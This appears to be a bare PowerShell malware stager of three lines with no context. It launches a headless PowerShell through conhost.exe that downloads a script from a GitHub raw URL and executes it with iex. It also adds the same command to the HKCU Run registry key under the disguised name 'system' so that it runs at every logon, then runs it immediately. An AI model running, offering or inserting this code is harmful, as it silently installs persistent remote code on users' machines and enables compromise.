$P="C:\Windows\System32\conhost.exe --headless powershell -c \`"iex (iwr raw.githubusercontent.com/rci69/f/refs/heads/main/a).content\`"";
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V system /t REG_SZ /F /D $P;
C:\Windows\System32\conhost.exe --headless powershell -c "iex (iwr raw.githubusercontent.com/rci69/f/refs/heads/main/a).content";
